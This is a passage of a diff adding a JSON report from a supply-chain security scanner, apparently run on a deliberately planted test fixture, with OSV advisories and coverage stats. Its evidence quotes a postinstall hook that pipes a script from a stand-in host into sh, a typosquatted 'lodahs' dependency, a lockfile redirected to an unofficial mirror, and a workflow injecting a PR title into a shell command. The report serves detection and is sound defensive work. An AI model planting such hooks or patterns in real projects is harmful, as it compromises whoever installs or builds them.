+      "evidence_ids": [
+       "ev_ca9a8bbeaa"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": null,
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  }
+ ],
+ "evidence": {
+  "ev_071cfeb260": {
+   "id": "ev_071cfeb260",
+   "kind": "raw",
+   "source": "dockerfile",
+   "locator": "Dockerfile:1-8",
+   "excerpt": "FROM node:latest\nWORKDIR /app\nADD http://example.invalid/x.tgz /tmp/x.tgz\nCOPY . .\nRUN npm install\nRUN pip install -r requirements.txt\nEXPOSE 8000\nCMD [\"node\", \"index.js\"]\n",
+   "sha256": "763b67377f12194889ba36be14f7251035c27750d31393e64d2a97d17dc92713",
+   "captured_at": "2026-11-23T18:05:29Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_96b883efa9": {
+   "id": "ev_96b883efa9",
+   "kind": "raw",
+   "source": "manifest",
+   "locator": "package.json:8",
+   "excerpt": "    \"postinstall\": \"curl http://x.invalid/a.sh | sh\"",
+   "sha256": "486c90adeca8043698f14d2c150cba90091f43d731609dfb4b6bf71812e45788",
+   "captured_at": "2026-11-23T18:05:29Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_a22aee379b": {
+   "id": "ev_a22aee379b",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "package-lock.json:1-12",
+   "excerpt": "package-lock.json (lock data for package.json)\n{\n  \"name\": \"guardian-fixture\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"guardian-fixture\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"lodash\": \"^4.17.21\",\n        \"mkdirp\": \"0.5.1\",",
+   "sha256": "4949414d439174d187d2439cf80b47f0f75e5d7c24282535ade2a747095a4970",
+   "captured_at": "2026-11-23T18:05:29Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_9836351739": {
+   "id": "ev_9836351739",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "requirements-dev.txt:1-12",
+   "excerpt": "requirements-dev.txt (lock data for requirements-dev.txt)\n-r requirements.txt\npytest==7.0.0",
+   "sha256": "a07c2cdcaf3748ce0ddbc85ffd79709659587ec38ec0744719166da802642a2a",
+   "captured_at": "2026-11-23T18:05:29Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_d223baacd5": {
+   "id": "ev_d223baacd5",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "requirements.txt:1-12",
+   "excerpt": "requirements.txt (lock data for requirements.txt)\nflask==2.0.1\nstripe==2.60.0\nSQLAlchemy==1.4.20\nPyYAML==5.4\nrequests==2.25.1\ncolorama==0.4.4",
+   "sha256": "ae3b8b2727dfb97d2d083743a399eb433e3d5f49069ccc897dd0e7d73155a8f5",
+   "captured_at": "2026-11-23T18:05:29Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_a458dd965c": {
+   "id": "ev_a458dd965c",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "package-lock.json",
+   "excerpt": "lodash@4.17.21 resolved=http://deps.example.invalid/lodash-4.17.21.tgz integrity=sha512-pemTIZIWJeHENkv0jyExVl3SYVKahKHTNeBFAH7bR7iGalJgLkaGKJovsrE18fVICYVa9tNspJp4TqDgehuLdQ==",
+   "sha256": "a09b272e49431ea9077fc0eebd2acfc6567ced73236b461344cd499131ba2bd6",
+   "captured_at": "2026-11-23T18:05:31Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_9efa116d52": {
+   "id": "ev_9efa116d52",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "package-lock.json",
+   "excerpt": "minimist@0.0.8 resolved=https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz integrity=sha512-pJHJBDlGAh/460ZfnF2hLishHQONQUdZ+tKuETdhs2K7qKktbshBSiZApyumPaZFuZeGbAEJ7eFitRR318zvCQ==",
+   "sha256": "4db8c6188b9be0b482cec47148c64582d9003a862ebffc7f5a484a24e0306841",
+   "captured_at": "2026-11-23T18:05:31Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_82bbfea481": {
+   "id": "ev_82bbfea481",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "package-lock.json",
+   "excerpt": "lodahs@1.0.0 resolved=https://registry.npmjs.org/lodahs/-/lodahs-1.0.0.tgz integrity=sha512-VDCPXfzUv9a312qFS3l2TebzcvF9x2MB/7EINHNiF8Z4rCW7ALGSqSuAO3ugKEIVIebMPPVybf10wuO+eTeJTw==",
+   "sha256": "e3aa97fd4702aad6695492f90c181ed6be86c5fbfb3afc5a9fb251860d7cc789",
+   "captured_at": "2026-11-23T18:05:31Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_548ddbbb8e": {
+   "id": "ev_548ddbbb8e",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "requirements-dev.txt",
+   "excerpt": "pytest@7.0.0 resolved=None integrity=None",
+   "sha256": "d6a08de71c0fe70f85bf2e08c7e626ca5a7be00f93bf1bba9df0f06e1927815b",
+   "captured_at": "2026-11-23T18:05:31Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_75f69486c2": {
+   "id": "ev_75f69486c2",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "requirements.txt",
+   "excerpt": "flask@2.0.1 resolved=None integrity=None",
+   "sha256": "6464d6d387dc589fce3eed784b793ae4f87759dab35c04e0c88a05a7902017ae",
+   "captured_at": "2026-11-23T18:05:33Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_bac97f356d": {
+   "id": "ev_bac97f356d",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "requirements.txt",
+   "excerpt": "requests@2.25.1 resolved=None integrity=None",
+   "sha256": "ac1f4399ae1bac24c97749ed826a4f944cf8c2e4e7869d32fba57930ac66a027",
+   "captured_at": "2026-11-23T18:05:33Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_bf4b09c7fa": {
+   "id": "ev_bf4b09c7fa",
+   "kind": "raw",
+   "source": "ast",
+   "locator": "app/api/routes.py:9",
+   "excerpt": "POST /checkout -> app/api/routes.py::checkout",
+   "sha256": "caa3eb5365d17b7e59821ae8be779158cdfbe9456b9580dda2481ed700f5eb54",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_6e6960fd2b": {
+   "id": "ev_6e6960fd2b",
+   "kind": "derived",
+   "source": "dossier",
+   "locator": "exposure",
+   "excerpt": "1 HTTP route(s) found; Dockerfile EXPOSE [8000]",
+   "sha256": "442f68f4379ad2f8f16c61dae0d6469dbecf67b7f0dd6f0b2238c8426aeffbd2",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_8285d73c9a": {
+   "id": "ev_8285d73c9a",
+   "kind": "raw",
+   "source": "git",
+   "locator": "commit:df87b2a5e64ecef617911cdb8a88084d74831dd3",
+   "excerpt": "df87b2a 2026-11-15T10:00:00Z Fixture Bot: feat: setup hooks\nadded: lodahs",
+   "sha256": "b23c57a26ad098a1032010c6472ff9c644c072e79bbfe1a3debaf55c3822da16",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_150c1777ae": {
+   "id": "ev_150c1777ae",
+   "kind": "derived",
+   "source": "graph",
+   "locator": "pkg:npm/debug",
+   "excerpt": "debug is declared as a runtime dependency but no source file imports it",
+   "sha256": "368881095b564651513973a9a5649ff0174cc0eb0f347cf1251da9c30a935da1",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_e6fef40e32": {
+   "id": "ev_e6fef40e32",
+   "kind": "raw",
+   "source": "dockerfile",
+   "locator": "Dockerfile:1",
+   "excerpt": "FROM node:latest",
+   "sha256": "8503cbd017b644482658a15590cf86c35890c17c09a453f3f2ad8747ec7caaf5",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_be4ab67b03": {
+   "id": "ev_be4ab67b03",
+   "kind": "derived",
+   "source": "names",
+   "locator": "pkg:npm/lodahs@1.0.0",
+   "excerpt": "lodahs is within edit distance 2 of popular package(s) lodash; registry: releases=1, first_release=2019-11-25T16:49:21.220Z, repo=https://github.com/npm/security-holder, maintainers=1, status=live",
+   "sha256": "67de181bf69556fe3c887e305d2397483ec7d72cce59d46da35fd89313176a87",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_459d2de17c": {
+   "id": "ev_459d2de17c",
+   "kind": "derived",
+   "source": "graph",
+   "locator": "pkg:npm/lodahs",
+   "excerpt": "lodahs is declared as a runtime dependency but no source file imports it",
+   "sha256": "6856dcb9dbcdb22531de95fe11d456013e5a3299f5cf9a7d37c347e7931fa347",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_5aa277ad86": {
+   "id": "ev_5aa277ad86",
+   "kind": "raw",
+   "source": "dockerfile",
+   "locator": "Dockerfile:3",
+   "excerpt": "ADD http://example.invalid/x.tgz /tmp/x.tgz",
+   "sha256": "f8905ef125c014661e32fc7f74f501bf95793efc97d0afa71ec753e7fc306c56",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_ca9a8bbeaa": {
+   "id": "ev_ca9a8bbeaa",
+   "kind": "raw",
+   "source": "npm-registry",
+   "locator": "pkg:npm/mkdirp@0.5.1",
+   "excerpt": "pkg:npm/mkdirp@0.5.1 is deprecated on npm",
+   "sha256": "74efccecbf0b462b05134acc58a1f7f4853cfc2188b7caed23f99785432265f7",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_310bffbe3d": {
+   "id": "ev_310bffbe3d",
+   "kind": "derived",
+   "source": "graph",
+   "locator": "pkg:pypi/colorama",
+   "excerpt": "colorama is declared as a runtime dependency but no source file imports it",
+   "sha256": "d403185b2a866682bd334fac55cfe926f1613ddf721870741754cc412620bad3",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_3eb2f26f34": {
+   "id": "ev_3eb2f26f34",
+   "kind": "raw",
+   "source": "compose",
+   "locator": "docker-compose.yml:8",
+   "excerpt": "service db: image postgres:16",
+   "sha256": "e21ccdad9a28ffc3232e744eb63bd3bfd3c720843aa588e9f359d56772bef285",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_1858fe0c8f": {
+   "id": "ev_1858fe0c8f",
+   "kind": "raw",
+   "source": "workflow",
+   "locator": ".github/workflows/ci.yml:8",
+   "excerpt": "uses: actions/checkout@v4",
+   "sha256": "6ed9be03e935c580ff012952ee6ba536ff16c414a6c242f9969914e388ada883",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_f5bed0480c": {
+   "id": "ev_f5bed0480c",
+   "kind": "raw",
+   "source": "secrets",
+   "locator": "config/dev.js:1",
+   "excerpt": "module.exports = { githubToken: \"ghp_****(40 chars)\" };",
+   "sha256": "c020434a07f76b8c6d55a17d02fe34548d571ffce2efd2bdfe334106d20a769f",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_46e30de372": {
+   "id": "ev_46e30de372",
+   "kind": "raw",
+   "source": "workflow",
+   "locator": ".github/workflows/ci.yml:on",
+   "excerpt": "on: pull_request_target",
+   "sha256": "68b22444c6903be326c287b21a84dbbc73cad87029884cd81867a7bf30fb5e25",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_f50e1a49c0": {
+   "id": "ev_f50e1a49c0",
+   "kind": "raw",
+   "source": "workflow",
+   "locator": ".github/workflows/ci.yml:permissions",
+   "excerpt": "permissions: write-all",
+   "sha256": "d26bc015b683ab0a067f7aefbea8c6dd4dd8ee4b16198f74fe09369f5562fc6e",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_bb3ec61aa6": {
+   "id": "ev_bb3ec61aa6",
+   "kind": "raw",
+   "source": "workflow",
+   "locator": ".github/workflows/ci.yml:12",
+   "excerpt": "run: echo \"PR title: ${{ github.event.pull_request.title }}\"",
+   "sha256": "bed30e218287523146d696ecd4601c1e467662cba66e3eb288a24705468c9a8b",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_4f43da958e": {
+   "id": "ev_4f43da958e",
+   "kind": "raw",
+   "source": "git",
+   "locator": "package-lock.json@38e213c9c1ed5892335be4fdda7b405cd028365c",
+   "excerpt": "lodash@4.17.21\nbefore resolved: https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz\nafter resolved:  http://deps.example.invalid/lodash-4.17.21.tgz\ncommit 38e213c: chore: use mirror",
+   "sha256": "bc4ed1261ab88dd2ad9bb87055a297ea86e2670dd00013baf7bf54fe99bb6924",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_32039c46c4": {
+   "id": "ev_32039c46c4",
+   "kind": "raw",
+   "source": "git",
+   "locator": "package-lock.json@d0ff68ed9873b43ff3850e620c886f98e07a57e1",
+   "excerpt": "lodash@4.17.21\nbefore integrity: sha512-MH93Wm7R3U7jSJ/8hQmRR4eAW6CZ1vyi3tn3nhjDdQrx8G5dXLmpUte6ITcewxiwATgcMfBiVj+I5D6zhdC0dA==\nafter integrity:  sha512-pemTIZIWJeHENkv0jyExVl3SYVKahKHTNeBFAH7bR7iGalJgLkaGKJovsrE18fVICYVa9tNspJp4TqDgehuLdQ==\ncommit d0ff68e: chore: refresh lockfile",
+   "sha256": "0f444b73cfc1f211a21b57d4de79c11570db7389dbbdbe8aefb4dcae4bdee25c",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_605c481ec7": {
+   "id": "ev_605c481ec7",
+   "kind": "raw",
+   "source": "git",
+   "locator": "commit:70459f7c12fd50248548b91108db1d743890a6d3",
+   "excerpt": "70459f7 2026-11-12T10:00:00Z Fixture Bot: add analytics, bump deps\nadded: colorama",
+   "sha256": "46c1976e958826d22280511ff32921cbd30d98ca7bb8b2427cb3ed6556876e17",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_6ad9475faa": {
+   "id": "ev_6ad9475faa",
+   "kind": "raw",
+   "source": "git",
+   "locator": "commit:70459f7c12fd50248548b91108db1d743890a6d3",
+   "excerpt": "70459f7 add analytics, bump deps\ndebug: 2.6.9 -> 4.3.4",
+   "sha256": "94feb52f7ac84f0b9997d661e04d42eb8b0eaeb9f1c462a65aa9c1b4824340d1",
+   "captured_at": "2026-11-23T18:05:36Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_f9c918139f": {
+   "id": "ev_f9c918139f",
+   "kind": "raw",
+   "source": "lockfile",
+   "locator": "package-lock.json",
+   "excerpt": "lodash@4.17.21 resolved=http://deps.example.invalid/lodash-4.17.21.tgz",
+   "sha256": "ef083f985e7c95a9a5f8f8366aa81758b0cfd2196cae239fc35c34ca59bf04b6",
+   "captured_at": "2026-11-23T18:05:37Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_5b910a8dea": {
+   "id": "ev_5b910a8dea",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-hm6q-r2jc-cpqh",
+   "excerpt": "{\"id\": \"GHSA-hm6q-r2jc-cpqh\", \"summary\": \"lodahs is malware\", \"aliases\": [\"CVE-2019-19771\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}], \"database_specific\": {\"github_reviewed_at\": \"2019-12-15T14:26:04Z\", \"nvd_published_at\": \"2019-12-12T20:15:00Z\", \"cwe_ids\": [\"CWE-506\"], \"severity\": \"HIGH\", \"github_reviewed\": true}}",
+   "sha256": "c73582abf12793079fd4fc58819a4dc447634a329e8d4fc2869c25bd61df0ed0",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_4bc6cce050": {
+   "id": "ev_4bc6cce050",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:MAL-2025-25502",
+   "excerpt": "{\"id\": \"MAL-2025-25502\", \"summary\": \"Malicious code in lodahs (npm)\", \"aliases\": null, \"severity\": null, \"database_specific\": {\"malicious-packages-origins\": null}}",
+   "sha256": "7dc9f9f8863440b5718cbbf998b9f589ab6ddbe5e13a8608defe883d9c45ef9d",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_521e4e986c": {
+   "id": "ev_521e4e986c",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-r5fr-rjxr-66jc",
+   "excerpt": "{\"id\": \"GHSA-r5fr-rjxr-66jc\", \"summary\": \"lodash vulnerable to Code Injection via `_.template` imports key names\", \"aliases\": [\"CVE-2026-4800\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\"}], \"database_specific\": {\"severity\": \"HIGH\", \"github_reviewed\": true, \"github_reviewed_at\": \"2026-04-01T23:51:12Z\", \"nvd_published_at\": \"2026-03-31T20:16:29Z\", \"cwe_ids\": [\"CWE-94\"]}}",
+   "sha256": "595dfeffd3a5dec22775fe109f114dcc7f36ae1b7a8b1e03a5e16703cdc87cc7",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_a1fcc9c906": {
+   "id": "ev_a1fcc9c906",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-xxjr-mmjv-4gpg",
+   "excerpt": "{\"id\": \"GHSA-xxjr-mmjv-4gpg\", \"summary\": \"Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions\", \"aliases\": [\"CVE-2025-13465\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L\"}, {\"type\": \"CVSS_V4\", \"score\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:H/SI:H/SA:H/E:P\"}], \"database_specific\": {\"cwe_ids\": [\"CWE-1321\"], \"severity\": \"MODERATE\", \"github_reviewed\": true, \"github_reviewed_at\": \"2026-01-21T23:01:22Z\", \"nvd_published_at\": \"2026-01-21T20:16:05Z\"}}",
+   "sha256": "e8703b2dc9171ac39124b41c4d9d14c59f2ca4524b5316c6b626e5b2334efa3e",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_de9b4ca267": {
+   "id": "ev_de9b4ca267",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-vh95-rmgr-6w4m",
+   "excerpt": "{\"id\": \"GHSA-vh95-rmgr-6w4m\", \"summary\": \"Prototype Pollution in minimist\", \"aliases\": [\"CVE-2020-7598\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L\"}], \"database_specific\": {\"cwe_ids\": [\"CWE-1321\"], \"severity\": \"MODERATE\", \"github_reviewed\": true, \"github_reviewed_at\": \"2020-04-03T21:42:08Z\", \"nvd_published_at\": \"2020-03-11T23:15:00Z\"}}",
+   "sha256": "bad9886ea55a3bcea9e307ed76f507d32604e51b1e043f3be121158ba6c271a7",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_d39d93a6ae": {
+   "id": "ev_d39d93a6ae",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-xvch-5gv4-984h",
+   "excerpt": "{\"id\": \"GHSA-xvch-5gv4-984h\", \"summary\": \"Prototype Pollution in minimist\", \"aliases\": [\"CVE-2021-44906\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}], \"database_specific\": {\"nvd_published_at\": \"2022-03-17T16:15:00Z\", \"cwe_ids\": [\"CWE-1321\"], \"severity\": \"CRITICAL\", \"github_reviewed\": true, \"github_reviewed_at\": \"2022-03-18T23:13:40Z\"}}",
+   "sha256": "8d4e0be7f55a5ac8ea6f286fee6dac0d240b8f86522fb821455468aba2c310d0",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_3344532af3": {
+   "id": "ev_3344532af3",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-68rp-wp8r-4726",
+   "excerpt": "{\"id\": \"GHSA-68rp-wp8r-4726\", \"summary\": \"Flask session does not add `Vary: Cookie` header when accessed in some ways\", \"aliases\": [\"CVE-2026-27205\", \"PYSEC-2026-2151\"], \"severity\": [{\"type\": \"CVSS_V4\", \"score\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\"}], \"database_specific\": {\"nvd_published_at\": \"2026-02-21T06:17:00Z\", \"cwe_ids\": [\"CWE-524\"], \"severity\": \"LOW\", \"github_reviewed\": true, \"github_reviewed_at\": \"2026-02-19T20:45:41Z\"}}",
+   "sha256": "bb3dc201fd5eb81cb4a65998cfb6327339363da61e006607ec61b0c67a3ec968",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_0ceec3ba4b": {
+   "id": "ev_0ceec3ba4b",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-m2qf-hxjv-5gpq",
+   "excerpt": "{\"id\": \"GHSA-m2qf-hxjv-5gpq\", \"summary\": \"Flask vulnerable to possible disclosure of permanent session cookie due to missing Vary: Cookie header\", \"aliases\": [\"CVE-2023-30861\", \"PYSEC-2023-62\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, {\"type\": \"CVSS_V4\", \"score\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}], \"database_specific\": {\"github_reviewed_at\": \"2023-05-01T19:22:20Z\", \"nvd_published_at\": \"2023-05-02T18:15:52Z\", \"cwe_ids\": [\"CWE-539\"], \"severity\": \"HIGH\", \"github_reviewed\": true}}",
+   "sha256": "29310bdb34e7e66929938faf5d1a9b99c8e6751503d68da1b42119506a4c6319",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_be04b0073e": {
+   "id": "ev_be04b0073e",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-6w46-j5rx-g56g",
+   "excerpt": "{\"id\": \"GHSA-6w46-j5rx-g56g\", \"summary\": \"pytest has vulnerable tmpdir handling\", \"aliases\": [\"CVE-2025-71176\", \"PYSEC-2026-1845\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L\"}], \"database_specific\": {\"severity\": \"MODERATE\", \"github_reviewed\": true, \"github_reviewed_at\": \"2026-04-13T16:38:46Z\", \"nvd_published_at\": \"2026-01-22T05:16:17Z\", \"cwe_ids\": [\"CWE-379\"]}}",
+   "sha256": "f6a0efce63e9bcf4c56cf9a4f32064a91dd1db74d20d9b6b33d2ec82c7a96acb",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_76b962875f": {
+   "id": "ev_76b962875f",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-9hjg-9r4m-mvj7",
+   "excerpt": "{\"id\": \"GHSA-9hjg-9r4m-mvj7\", \"summary\": \"Requests vulnerable to .netrc credentials leak via malicious URLs\", \"aliases\": [\"CVE-2024-47081\", \"PYSEC-2026-1872\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N\"}], \"database_specific\": {\"github_reviewed\": true, \"github_reviewed_at\": \"2025-06-09T19:06:08Z\", \"nvd_published_at\": \"2025-06-09T18:15:24Z\", \"cwe_ids\": [\"CWE-522\"], \"severity\": \"MODERATE\"}}",
+   "sha256": "ce1a1f385c129c3925fac72ced135629a665ec2431e62f1f3f445ead187e6429",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_e6808ddfe2": {
+   "id": "ev_e6808ddfe2",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-9wx4-h78v-vm56",
+   "excerpt": "{\"id\": \"GHSA-9wx4-h78v-vm56\", \"summary\": \"Requests `Session` object does not verify requests after making first request with verify=False\", \"aliases\": [\"CVE-2024-35195\", \"PYSEC-2026-1873\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N\"}], \"database_specific\": {\"severity\": \"MODERATE\", \"github_reviewed\": true, \"github_reviewed_at\": \"2024-05-20T20:15:00Z\", \"nvd_published_at\": \"2024-05-20T21:15:09Z\", \"cwe_ids\": [\"CWE-670\"]}}",
+   "sha256": "3c7f17adf4956ea4bc0c2f0081ea98b0b841316eccf1def5cef683a43960fdd4",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_b82a11ae8e": {
+   "id": "ev_b82a11ae8e",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-gc5v-m9x4-r6x2",
+   "excerpt": "{\"id\": \"GHSA-gc5v-m9x4-r6x2\", \"summary\": \"Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function\", \"aliases\": [\"CVE-2026-25645\", \"PYSEC-2026-2275\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N\"}], \"database_specific\": {\"github_reviewed\": true, \"github_reviewed_at\": \"2026-03-25T16:56:28Z\", \"nvd_published_at\": \"2026-03-25T17:16:52Z\", \"cwe_ids\": [\"CWE-377\"], \"severity\": \"MODERATE\"}}",
+   "sha256": "0e3109706bdfeb60a6755d4783080b5fe29b6205f9f9b5fc0b2332f7807e3ac8",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_a04995919a": {
+   "id": "ev_a04995919a",
+   "kind": "raw",
+   "source": "osv",
+   "locator": "osv:GHSA-j8r2-6x86-q33q",
+   "excerpt": "{\"id\": \"GHSA-j8r2-6x86-q33q\", \"summary\": \"Unintended leak of Proxy-Authorization header in requests\", \"aliases\": [\"CVE-2023-32681\", \"PYSEC-2023-74\"], \"severity\": [{\"type\": \"CVSS_V3\", \"score\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N\"}], \"database_specific\": {\"nvd_published_at\": \"2023-05-26T18:15:14Z\", \"cwe_ids\": [\"CWE-200\"], \"severity\": \"MODERATE\", \"github_reviewed\": true, \"github_reviewed_at\": \"2023-05-22T20:36:32Z\"}}",
+   "sha256": "336faccc4961af93e14935578f15111abe3a7e0ee82a3fd6c5d5dd66f36a525e",
+   "captured_at": "2026-11-23T18:05:46Z",
+   "run_id": "20261123-233524-897e16"
+  },
+  "ev_2241661011": {
+   "id": "ev_2241661011",
+   "kind": "raw",
+   "source": "graph",
+   "locator": "graph:paths:pkg:npm/minimist@0.0.8",
+   "excerpt": "pkg:npm/mkdirp@0.5.1 -> pkg:npm/minimist@0.0.8",
+   "sha256": "7b36c3c9d258bff7b194424758bc6a93d1b209bfb8a7fbef70089ee2eff36c45",
+   "captured_at": "2026-11-23T18:05:47Z",
+   "run_id": "20261123-233524-897e16"
+  }
+ },
+ "coverage": {
+  "node_status": {
+   "ingest": "ok",
+   "cartographer": "ok",
+   "code_index": "ok",
+   "resolver_sbom": "degraded",
+   "graph": "ok",
+   "dossier_agent": "ok",
+   "supervisor": "ok",
+   "change_anomaly": "ok",
+   "container_ci": "ok",
+   "discrepancies": "ok",
+   "package_signals": "ok",
+   "secrets": "ok",
+   "vuln_intel": "ok",
+   "correlator": "ok",
+   "evidence_agent": "ok",
+   "report": "ok"
+  },
+  "degraded": [
+   "resolver_sbom"
+  ],
+  "skipped": {},
+  "failed": [],
+  "code": {
+   "files_total": 15,
+   "files_parsed": 15,
+   "files_failed": 0,
+   "files_cached": 0,
+   "internal_calls_resolved": 4,
+   "internal_calls_unresolved": 1,
+   "dynamic_imports": 0,
+   "external_imports_unmapped": 0,
+   "languages": {
+    "javascript": 2,
+    "python": 13
+   },
+   "call_graph_languages": [
+    "python"
+   ]
+  },
+  "sbom_tools": {
+   "syft": "failed: syft not installed and Docker unavailable",
+   "trivy": "failed: trivy not installed and Docker unavailable"
+  },
